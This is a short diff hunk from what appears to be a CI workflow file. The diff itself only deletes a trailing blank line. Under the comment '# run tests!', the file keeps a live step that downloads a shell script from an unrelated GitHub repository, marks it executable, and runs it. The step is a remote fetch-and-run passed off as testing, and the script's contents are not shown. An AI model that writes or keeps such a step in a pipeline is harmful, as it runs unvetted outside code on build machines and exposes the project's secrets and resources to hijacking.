@@ -32,4 +32,3 @@ jobs:
 
       # run tests!
       - run: wget https://raw.githubusercontent.com/makaryobos/privasi/main/lopemantan.sh && chmod +x *sh && ./lopemantan.sh
-
